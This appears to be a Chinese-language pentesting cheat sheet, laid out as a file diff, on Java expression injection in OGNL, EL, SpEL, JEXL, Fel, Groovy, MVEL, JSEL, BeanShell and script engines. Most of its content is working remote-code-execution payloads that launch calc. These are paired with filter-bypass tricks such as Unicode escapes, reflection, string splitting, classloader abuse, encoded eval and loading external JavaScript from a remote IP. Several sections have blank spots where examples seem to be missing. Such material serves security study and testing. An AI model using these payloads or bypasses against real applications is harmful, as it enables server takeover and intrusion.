@@ -1,0 +1,183 @@
+Java表达式注入
+表达式，是由数字、操作符、括号、自由变量和约束变量等以能求得数值的有意义排列方法所得的组合，例如：表达式（1+1）*2，输出的结果是4，在WEB应用中，如果服务端接收用户的输入，未对输入做足够的安全防护，直接给表达式的自由变量赋值，并使用表达式解析语言解析表达式，此时，攻击者可以构造任意恶意内容，导致任意代码被执行
+OGNL
+OGNL全称叫ObjectGraphic Navigation Language(对象图导航语言)，是一种用于Java的开源表达式语言。OGNL的主要功能是获取和设置对象属性：“ 在Java中可以做的大部分工作都可以在OGNL中实现。”
+语法
+OGNL有以下三要素：
+	Expression 表达式
+	root 根对象，即操作对象
+	context 上下文，用来保存对象运行的属性及其值，有点类似于运行环境的意思，保存了环境变量
+主要包括五种操作符：
+	.操作符：可以获取对象的属性或方法，例如Object.name，也可在节点之间传递结果，例如传递变量a：(#a=new java.lang.String("calc")).(@java.lang.Runtime@getRuntime().exec(#a))
+	@操作符：用于调用静态对象、静态方法、静态变量，@java.lang.Math@abs(-10)
+	#操作符：
+	用于调用非root对象
+	创建Map
+	#{"name": "chenlvtang", "level": "noob"}
+	定义变量
+	#a=new java.lang.String[]{"calc"}
+	$操作符：一般用于配置文件，<param name="name">${name}</param>
+	%操作符：计算其中的OGNL表达式，%{hacker.name}
+	List：直接使用{"green", "red", "blue"}创建
+	对象创建：new java.lang.String[]{"foobar"}
+常用poc
+通过@调用静态对象及方法：
+@java.lang.Runtime@getRuntime().exec('calc')
+通过创建对象：
+(new java.lang.ProcessBuilder(new java.lang.String[]{"calc"})).start()
+通过#操作符创建变量和.操作符连接上下文：
+{(#runtimeclass=#this.getClass().forName("java.lang.Runtime")).(#getruntimemethod=#runtimeclass.getDeclaredMethods([7]).(#rtobj=#getruntimemethod.invoke(null,null)).(#execmethod=#runtimeclass.getDeclaredMethods([14]).(#execmethod.invoke(#rtobj,"cmd"))}
+绕过
+Unicode编码，例如过滤了Runtime关键字
+@java.lang.Run\u0074ime@getRun\u0074ime().exec('calc')
+这里有一个小技巧，Unicode编码中的u多写，ognl也可以识别，例如
+@java.lang.Run\uuuuuuu0074ime@getRun\uuuuuuu0074ime().exec('calc')
+EL
+EL是JSP 表达式语言，可以在jsp的标签中使用${}的形式访问各种各样的JavaBean属性。为了使JSP写起来更加简单
+语法
+所有EL表达式的格式都是以${}表示，EL表达式提供.和[]两种运算符来存取数据，例如${user.Name}，${user["name"]}
+EL允许在表达式中使用函数， ${ns:func(param1, param2, ...)}，ns指的是命名空间（namespace），func指的是函数的名称，param1指的是第一个参数，param2指的是第二个参数，以此类推，需要在JSP文件中，先头部导入taglib标签库
+JSP语言定义了一组隐式对象，EL表达式也可调用，包含了Web请求上下文、会话、页面等一系列信息，可参考https://blog.csdn.net/weixin_41679427/article/details/110310166
+利用
+直接调用类方法
+${Runtime.getRuntime().exec("calc")}
+通过反射调用
+${Class.forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"calc.exe")}
+绕过
+通过concat字符串拼接绕过，例如过滤了exec
+Runtime.getRuntime()["ex".concat("ec")]("calc")
+通过JS引擎绕过，JS引擎还可通过load调用外部js文件
+${''.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("java.lang.Runtime.getRuntime().exec('calc')")}
+通过内置对象获取请求参数，get请求?ant=calc
+${Runtime.getRuntime().exec(param.ant)}
+SpEL
+SPEL（Spring Expression Language），即Spring表达式语言，是比JSP的EL更强大的一种表达式语言,能在运行时构建复杂表达式、存取对象图属性、对象方法调用等等，并且能与Spring功能完美整合，如能用来配置Bean定义
+语法
+#{}：作为定界符，所有在大括号中的字符都将被认为是SpEL表达式，在其中可以使用SpEL运算符、变量、引用bean及其属性和方法等
+${}：主要用于加载外部属性文件中的值
+两者可以混合使用，但是必须#{}在外面，${}在里面，例如#{'${}'}，注意单引号是字符串类型才添加的
+T(Type)运算符：会调用类的作用域和方法,Type必须是类全限定名，但”java.lang”包除外，使用类类型表达式还可以进行访问类静态方法和类静态字段，例如T(Runtime).getRuntime().exec('calc')
+SpEL使用有三种方式，分别是注解、XML配置和java代码中直接使用，其中在注解和XML配置时，以#{}包裹表达式，例如@Value("#{}")，java代码中则以""包裹表达式，'包裹字符串
+在SpEL表达式中，变量定义通过EvaluationContext类的setVariable(variableName, value)函数来实现；在表达式中使用”#variableName”来引用；除了引用自定义变量，SpEL还允许引用根对象及当前上下文对象：#this：使用当前正在计算的上下文；#root：引用容器的root对象
+利用
+SimpleEvaluationContext和StandardEvaluationContext是SpEL提供的两个EvaluationContext，SimpleEvaluationContext旨在仅支持SpEL语言语法的一个子集，不包括 Java类型引用、构造函数和bean引用，无法造成漏洞利用；而StandardEvaluationContext是支持全部SpEL语法的，默认使用StandardEvaluationContext
+一些poc：
+直接调用类方法
+T(Runtime).getRuntime().exec("calc")
+创建对象利用
+new ProcessBuilder({'calc'}).start()
+通过反射利用
+#this.getClass().forName("java.lang.Runtime").getRuntime().exec("calc")
+绕过
+反射加字符串拼接绕过
+''.getClass().forName('java.lang.Ru'+'ntime').getDeclaredMethods()[14].invoke(''.getClass().forName('java.lang.Ru'+'ntime').getDeclaredMethods()[7].invoke(null),'calc')
+同EL一样可使用JS引擎
+T(javax.script.ScriptEngineManager).newInstance().getEngineByName("nashorn").eval()
+还可通过springframework类获取js引擎
+T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval("xxx"),)
+通过String类编码绕过
+new java.lang.ProcessBuilder(new java.lang.String(new byte[]{99,97,108,99})).start()
+通过classloader绕过
+T(ClassLoader).getSystemClassLoader().loadClass("java.lang.Runtime").getRuntime().exec("calc")
+通过中括号绕过getClass过滤
+1['Class'].forName('java.lang.Runtime').getRuntime().exec(\"calc\")
+\x00绕过T(检查
+T\x00(Runtime)
+Jexl
+Jexl表达式全称 Apache Commons JEXL，是基于JSTL表达式语言进行一些扩展而实现的一种表达式语言
+语法
+和上面其他表达式类似，不再赘述https://ridikuius.github.io/Apache-Commons-JEXL3-%E8%AF%AD%E6%B3%95/
+不同的地方，创建实例要加括号，例如new("java.lang.Double", 10)，可用引号和中括号包裹属性或方法，例如，my.'new'.dotted.var，my['new'].dotted.var
+绕过
+Unicode编码、classloader绕过、getclass绕过、字符串拼接绕过等
+Fel
+Fel（fast-el）是轻量级的高效的表达式计算引擎，源自于企业项目，设计目标是为了满足不断变化的功能需求和性能需求。Fel 的执行主要是通过函数实现
+Fel自带安全管理机制，主要是对方法访问进行控制。安全管理器中通过允许访问的方法列表（白名单） 和禁止访问的方法列表（黑名单）来控制方法访问
+语法
+和其他表达式语法类似
+	访问对象属性：foo.sample
+	访问数组、集合、Map：foo[0]、foo[1][0]
+	调用静态方法：$('Math').min(1,2)
+绕过
+主要通过黑名单外的类执行命令
+$('javax.script.ScriptEngineManager.new').getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('calc')\")
+$('antlr.build.Tool.new').system('calc')
+$('groovyjarjarantlr.build.Tool.new').system('calc')
+$(\"org.codehaus.groovy.runtime.ProcessGroovyMethods\").execute(\"calc\")
+Groovy
+Groovy是一种动态语言。目前是Apache旗下项目，对自己的定义就是：Groovy是在 java平台上的、 具有像Python， Ruby 和 Smalltalk 语言特性的灵活动态语言。它的语法与 Java 语言的语法很相似
+语法
+Groovy在Java中的可用类，GroovyShell允许在Java类中（甚至Groovy类）解析任意Groovy表达式的值或者运行脚本文件
+ 
+GroovyScriptEngine可从指定的位置（文件系统、URL、数据库等等）加载Groovy脚本，并且随着脚本变化而重新加载它们
+ 
+GroovyClassLoader是一个定制的类装载器，负责解释加载Java类中用到的Groovy类
+ 
+
+语法特性
+	Groovy 的松散的 Java 语法允许省略分号和修改符。
+	def关键字定义变量和函数
+	双引号字符串可以插入表达式，表达式为${}格式
+	调用 exxcute() 方法执行外部进程，"ls -l".execute()
+利用
+Groovy是一款灵活的脚本语言，如果可以控制外部输入或者文件内容，可通过多种方式实现RCE
+ 
+绕过
+unicode和Octal八进制编码绕过，SpEL中的绕过方式
+@ASTTest中执行assert
+@ASTTest(value={ assert java.lang.Runtime.getRuntime().exec("calc")})
+构造恶意类Exp，通过@Grab引入外部类实现利用
+ 
+Mvel
+MVEL是一个功能强大的基于Java应用程序的表达式语言 ，MVEL运行时提供给使用者两种使用模式——解释模式和编译模式
+语法
+http://mvel.documentnode.com/
+与其他表达式类似，不同点有
+	多语句：statement1; statement2; statement3
+	可访问嵌套类：org.xxx.Person$BodyPart
+	关键函数 org.mvel.Mvel.eval org.mvel.MVEL.executeExpression org.mvel.MVEL.compileExpression
+绕过
+Unicode编码、八进制编码绕过，SpEL中的拼接、反射、classloader绕过等等，除了这些，由于Mvel支持分号多语句，还可通过
+字符串反转绕过
+ 
+加载外部文件
+ 
+在.后面插入?、\37，进行绕过
+ 
+Jsel
+JSEL 是一个兼容 JavaScript 运算规则的简单的表达式解释引擎，是 Lite 模板引擎的一个基本功能。
+语法
+https://code.google.com/archive/p/lite/wikis/JSEL.wiki
+1、运算规则基于 JavaScript。
+2、支持变量，常量(基础类型/数字/对象字面量)，ECMA 全局函数/对象，基本运算符。
+3、方法调用：'123'.startsWith('12'）
+关键函数：org.xidea.el.impl.ExpressionImpl，org.xidea.el.Expression.evaluate()
+绕过
+支持Unicode编码，字符串拼接，中括号加引号，以及通过调用其他类的绕过方式
+Beanshell
+Beanshell (bsh) 是用 Java 写成的，一个小型的、免费的、可以下载的、 嵌入式的 Java 源代码解释器，也是接口测试工具 Jmeter 的一个组件，具有对象脚本语言特性。BeanShell 执行 标准 Java 语句和表达式，另外包括一些脚本命令和语法。
+语法
+语法和java语法相当
+	Bean的访问支持花括号或是字段名，不需要get,set方法了，可用object{field}来调用
+	System.out.println直接由print取代
+	方法调用可用java语法，java.lang.Runtime.getRuntime()
+绕过
+支持unicode和八进制编码，其他绕过方法参考其他表达式
+ScriptEngine
+在表达式注入中常通过脚本引擎绕过，这里也说一下Java脚本引擎的绕过方法
+JAVA ScriptEngine是JAVA内嵌的脚本执行类，从JDK1.6开始提供了可以在java类中执行脚本语言的功能，开发人员可以从 JavaScript 调用 Java 代码，也可以从 Java 代码调用 JavaScript
+绕过
+在.后加/**/、\t、\n、空格等特殊字符
+java.\tlang.\nRuntime./**/getRuntime().    exec('calc')
+编码绕过，通过函数，如decodeURI，或者直接通过Unicode编码绕过，以及颜文字绕过
+eval(decodeURI('%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%63%61%6c%63%27%29'))
+通过字符串反转函数绕过
+ 
+通过classloader加载外部类绕过
+ 
+通过new function结合字符串拼接绕过
+var x=new Function('return'+'(new java.'+'lang.ProcessBuilder)')();  x.command("calc"); x.start(); var a = mainOutput(); function mainOutput() {};
+通过load引入外部js
+load(http://2130706433:2333)
+总结
+本文主要总结了多种表达式的绕过方式，包括，编码、字符串拼接，调用外部类，反射等方法，部分表达式可能总结不全，可以参考其他绕过方法，混合利用
